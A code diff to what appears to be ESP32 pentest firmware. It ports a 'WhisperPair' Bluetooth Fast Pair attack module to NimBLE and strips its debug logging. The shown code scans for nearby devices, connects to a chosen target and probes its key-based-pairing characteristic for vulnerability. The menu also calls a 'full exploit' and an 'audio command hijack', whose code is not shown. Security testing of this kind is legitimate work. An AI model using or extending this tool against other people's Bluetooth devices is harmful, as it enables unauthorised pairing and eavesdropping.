@@ -2,12 +2,12 @@
 #include "whisperpair_audio.h"
 #include <globals.h>
 #include "core/display.h"
-#include "core/mykeyboard.h"
-#include <BLEDevice.h>
-#include <BLEAdvertisedDevice.h>
-#include <BLEScan.h>
-#include <BLEClient.h>
-#include <BLEUtils.h>
+
+#ifdef CONFIG_BT_NIMBLE_ENABLED
+#if __has_include(<NimBLEExtAdvertising.h>)
+#define NIMBLE_V2_PLUS 1
+#endif
+#endif
 
 extern std::vector<String> fastPairDevices;
 extern bool returnToMenu;
@@ -16,12 +16,8 @@ bool initBLEIfNeeded(const char* deviceName) {
     static bool initialized = false;
     
     if (!initialized) {
-        Serial.printf("[BLE INIT] Initializing ESP32 BLE as '%s'\n", deviceName);
-        
-        BLEDevice::init(deviceName);
-        delay(100);
-        
-        Serial.println("[BLE INIT] ESP32 BLE initialized successfully");
+        NimBLEDevice::init(deviceName);
+        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
         initialized = true;
     }
     
@@ -79,27 +75,27 @@ bool requireSimpleConfirmation(const char* message) {
     }
 }
 
-bool attemptKeyBasedPairing(BLEAddress target) {
+bool attemptKeyBasedPairing(NimBLEAddress target) {
     displayMessage("Connecting to target...", "", "", "", TFT_WHITE);
-    BLEClient* pClient = BLEDevice::createClient();
+    NimBLEClient* pClient = NimBLEDevice::createClient();
     if(!pClient->connect(target)) {
         displayMessage("Connection failed", "", "", "", TFT_WHITE);
-        BLEDevice::deleteClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
         return false;
     }
     displayMessage("Connected, discovering...", "", "", "", TFT_WHITE);
-    BLERemoteService* pService = pClient->getService(BLEUUID((uint16_t)0xFE2C));
+    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(pService == nullptr) {
         displayMessage("Fast Pair service not found", "", "", "", TFT_WHITE);
         pClient->disconnect();
-        BLEDevice::deleteClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
         return false;
     }
-    BLERemoteCharacteristic* pChar = pService->getCharacteristic(BLEUUID((uint16_t)0x1234));
+    NimBLERemoteCharacteristic* pChar = pService->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
     if(pChar == nullptr) {
         displayMessage("KBP char not found", "", "", "", TFT_WHITE);
         pClient->disconnect();
-        BLEDevice::deleteClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
         return false;
     }
     uint8_t packet[16] = {0};
@@ -118,7 +114,7 @@ bool attemptKeyBasedPairing(BLEAddress target) {
         delay(100);
         bool vulnerable = pChar->canRead() || pChar->canNotify();
         pClient->disconnect();
-        BLEDevice::deleteClient(pClient);
+        NimBLEDevice::deleteClient(pClient);
         if(vulnerable) {
             displayMessage("DEVICE VULNERABLE!", "", "", "", TFT_WHITE);
             return true;
@@ -128,13 +124,11 @@ bool attemptKeyBasedPairing(BLEAddress target) {
         }
     }
     pClient->disconnect();
-    BLEDevice::deleteClient(pClient);
+    NimBLEDevice::deleteClient(pClient);
     return false;
 }
 
 String selectTargetFromScan(const char* title) {
-    Serial.printf("\n[SCAN] Starting scan with title: %s\n", title);
-    
     struct BLE_Device {
         std::string address;
         std::string name;
@@ -146,34 +140,30 @@ String selectTargetFromScan(const char* title) {
 
     initBLEIfNeeded("scanner");
 
-    BLEScan* pScan = BLEDevice::getScan();
+    NimBLEScan* pScan = NimBLEDevice::getScan();
     if (!pScan) {
-        Serial.println("[SCAN] ERROR: Failed to get scanner!");
         displayMessage("Scanner init failed", "OK", "", "", TFT_RED);
         return "";
     }
     
-    Serial.println("[SCAN] Scanner obtained successfully");
-    
     pScan->clearResults();
 
-    class SimpleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
+    class SimpleScanCallbacks : public NimBLEScanCallbacks {
         std::vector<BLE_Device>& devices;
         bool& scanningRef;
     public:
         SimpleScanCallbacks(std::vector<BLE_Device>& devs, bool& scanningFlag) 
             : devices(devs), scanningRef(scanningFlag) {}
 
-        void onResult(BLEAdvertisedDevice advertisedDevice) {
+        void onResult(NimBLEAdvertisedDevice* advertisedDevice) {
+            if(!advertisedDevice) return;
+            
             BLE_Device device;
-            device.address = advertisedDevice.getAddress().toString();
-            device.name = advertisedDevice.getName();
-            device.rssi = advertisedDevice.getRSSI();
+            device.address = advertisedDevice->getAddress().toString();
+            device.name = advertisedDevice->getName();
+            device.rssi = advertisedDevice->getRSSI();
             
             if(device.name.empty()) device.name = "<no name>";
-            
-            Serial.printf("[SCAN] Found: %s - %s (%d dBm)\n", 
-                device.address.c_str(), device.name.c_str(), device.rssi);
             
             bool exists = false;
             for(auto& dev : devices) {
@@ -187,10 +177,14 @@ String selectTargetFromScan(const char* title) {
                 devices.push_back(device);
             }
         }
+        
+        void onScanEnd(NimBLEScanResults results) {
+            scanningRef = false;
+        }
     };
 
     SimpleScanCallbacks* callbacks = new SimpleScanCallbacks(foundDevices, scanning);
-    pScan->setAdvertisedDeviceCallbacks(callbacks);
+    pScan->setScanCallbacks(callbacks, true);
     
     pScan->setActiveScan(true);
     pScan->setInterval(98);
@@ -216,7 +210,6 @@ String selectTargetFromScan(const char* title) {
     scanning = true;
     uint32_t scanStartTime = millis();
     
-    Serial.println("[SCAN] Starting scan...");
     pScan->start(0, false);
     
     static int barPos = 0;
@@ -246,7 +239,6 @@ String selectTargetFromScan(const char* title) {
         if(check(EscPress)) {
             pScan->stop();
             scanning = false;
-            Serial.println("[SCAN] Scan stopped by user");
             break;
         }
         
@@ -254,9 +246,6 @@ String selectTargetFromScan(const char* title) {
     }
 
     pScan->clearResults();
-    delete callbacks;
-    
-    Serial.printf("[SCAN] Scan complete. Found %d devices\n", foundDevices.size());
 
     if(foundDevices.empty()) {
         displayMessage("NO DEVICES FOUND", "OK", "", "", TFT_YELLOW);
@@ -327,7 +316,6 @@ String selectTargetFromScan(const char* title) {
         } else if(check(SelPress)) {
             if(currentIndex < foundDevices.size()) {
                 selectedMAC = String(foundDevices[currentIndex].address.c_str());
-                Serial.printf("[SCAN] Selected MAC: %s\n", selectedMAC.c_str());
             }
         }
     }
@@ -341,16 +329,11 @@ void testFastPairVulnerability() {
     String selectedMAC = selectTargetFromScan("SELECT TARGET");
     if(selectedMAC.isEmpty()) return;
     
-    BLEAddress target(selectedMAC.c_str());
+    NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
     
     if(!requireSimpleConfirmation("Test vulnerability?")) return;
     
     bool vulnerable = attemptKeyBasedPairing(target);
-    
-    Serial.printf("[WhisperPair] %s - %s\n", 
-        selectedMAC.c_str(), 
-        vulnerable ? "VULNERABLE" : "PATCHED/SAFE"
-    );
     
     delay(2000);
 }
@@ -401,7 +384,7 @@ void whisperPairMenu() {
         }
         String selectedMAC = selectTargetFromScan("SELECT TARGET");
         if(selectedMAC.isEmpty()) return;
-        BLEAddress target(selectedMAC.c_str());
+        NimBLEAddress target(selectedMAC.c_str(), BLE_ADDR_RANDOM);
         int8_t confirm = displayMessage("Confirm full exploit?", "No", "Yes", "Back", TFT_YELLOW);
         if(confirm != 1) return;
         bool success = whisperPairFullExploit(target);
@@ -414,10 +397,6 @@ void whisperPairMenu() {
 
     options.push_back({"[Audio CMD Hijack]", []() {
         audioCommandHijackTest();
-    }});
-
-    options.push_back({"[Debug Menu]", []() {
-        whisperPairDebugMenu();
     }});
 
     options.push_back({"[Back]", []() { returnToMenu = true; }});
